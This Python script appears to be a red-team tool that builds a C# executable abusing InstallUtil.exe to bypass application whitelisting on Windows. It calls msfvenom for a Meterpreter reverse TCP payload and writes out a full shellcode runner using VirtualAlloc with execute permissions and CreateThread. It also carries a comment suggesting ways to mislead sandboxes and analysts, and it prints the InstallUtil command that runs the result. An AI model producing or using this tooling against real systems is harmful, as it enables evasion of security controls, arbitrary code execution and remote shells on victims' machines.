#!/bin/python

import os
import sys
import subprocess
import argparse

#commandline args
parser = argparse.ArgumentParser(description='Generates an exe that can take advantage of the InstallUtil whitelist evasion technique.')
parser.add_argument('--cs_file', dest='inp_name', action='store', default='script.cs')
parser.add_argument('--exe_file', dest='outp_name', action='store', default='script.exe')
#parser.add_argument('--arch', dest='arch', action='store', default='')	
parser.add_argument('--payload', dest='payload', action='store', default='windows/meterpreter/reverse_tcp')
parser.add_argument('--lhost', dest='lhost', action='store', default='127.0.0.1')
parser.add_argument('--lport', dest='lport', action='store', default='443')

args=parser.parse_args()
#msfvenom generated payload.  Future revisions may support different payload generation techniques
print "Generating shellcode using msfvenom...\n"
payload = subprocess.check_output(["msfvenom","-p",args.payload,"-f","csharp","LHOST="+args.lhost,"LPORT="+args.lport])

# file header:  All the .NET references required and a brief intro/demo
file_header = "/*Generated by InstallUtil.py, by @khr0x40sh*/\nusing System;\nusing System.Diagnostics;\nusing System.Reflection;\nusing System.Configuration.Install;\nusing System.Net;\n";
file_header = file_header + "using System.Net.Sockets;\nusing System.Runtime.InteropServices;\n\n";
file_header = file_header + "/*\nAuthor: Casey Smith, Twitter: @subTee\nLicense: BSD 3-Clause\n\nStep One:\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe  /out:exeshell.exe exeshell.cs\n";
file_header = file_header + "Step Two:\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe\n";
file_header = file_header + "See https://gist.github.comsubTee/0dc27475f141cc3a1b50 for details.\n*/\n";

# file main, Namespace, Main, and top of the Uninstall class
file_main ="namespace Exec\n{\n\tpublic class Program\n\t{\n\n\t\tpublic static void Main()\n\t\t{\n\t\t\tConsole.WriteLine(\"Hello From Main...I Don't Do Anything\");\n\t\t\t//Add any behaviour here to throw off sandbox execution/analysts :)\n\n\t\t}\n\t}\n";
file_uninst_top = "\n\t[System.ComponentModel.RunInstaller(true)]\n\tpublic class Sample : System.Configuration.Install.Installer\n\t{\n\t\t";

# file 64 top, Global defined variables
file_64_top = "\t\tprivate static UInt32 MEM_COMMIT = 0x1000;\n\t\tprivate static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\t\tprivate static UInt32 MEM_RELEASE = 0x8000;\n\n";

# file uninst mid, First call to Uninstall and an optional stdout statement.
file_uninst_mid ="\t\t//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.\n\t\tpublic override void Uninstall(System.Collections.IDictionary savedState)\n\t\t{\n\t\t\tConsole.WriteLine(\"Hello From Uninstall...I carry out the real work...\"); //debug\n\t\t\t//ShellCode.DoEvil();\n\n\t\t\t";

# file 64 mid, Payload inclusion, the meat of shellcode execution.  Despite name, runs on both 32 and 64 bit architectures.
file_64_mid =payload+"\n\t\t\tUInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\t\t\tMarshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);\n\t\t\tIntPtr hThread = IntPtr.Zero;\n\t\t\tUInt32 threadId = 0;\n\n\t\t\t// prepare data\n\n\t\t\tPROCESSOR_INFO info = new PROCESSOR_INFO();\n\t\t\tIntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));\n\t\t\tMarshal.StructureToPtr(info, pinfo, false);\n\n\t\t\t// execute native code\n\n\t\t\thThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\t\t\tWaitForSingleObject(hThread, 0xFFFFFFFF);\n\n\t\t\t// retrive data\n\n\t\t\tinfo = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO));\n\t\t\tMarshal.FreeHGlobal(pinfo);\n\t\t\tCloseHandle(hThread);\n\t\t\tVirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE);\n\t\t}\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern bool CloseHandle(IntPtr handle);\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );\n\n\t\t[DllImport(\"kernel32\")]private static extern IntPtr GetModuleHandle( string moduleName );\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern UInt32 GetProcAddress( IntPtr hModule, string procName );\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern UInt32 LoadLibrary( string lpFileName );\n\n\t\t[DllImport(\"kernel32\")]\n\t\tprivate static extern UInt32 GetLastError();\n\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tinternal struct PROCESSOR_INFO\n\t\t{\n\t\t\tpublic UInt32 dwMax;\n\t\t\tpublic UInt32 id0;\n\t\t\tpublic UInt32 id1;\n\t\t\tpublic UInt32 id2;\n\t\t\tpublic UInt32 dwStandard;\n\t\t\tpublic UInt32 dwFeature;\n\n\t\t\t// if AMD\n\t\t\tpublic UInt32 dwExt;\n\t\t}\n\n\t\t}\n}";

#put it all together
total_file = file_header + file_main + file_uninst_top + file_64_top + file_uninst_mid + file_64_mid

print total_file #debug
f = open(args.inp_name, "w")
f.write(total_file)
f.close()

#arch check for mcs (mono)
arch2="x86"
if "x64" in args.payload:
	arch2 = "x64"

subprocess.call(["mcs","-platform:"+arch2,"-target:winexe","-r:/usr/lib/mono/2.0/System.Configuration.Install.dll",args.inp_name,"-out:"+args.outp_name])

print args.outp_name+" should be available now.\nRemember to use C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U "+args.outp_name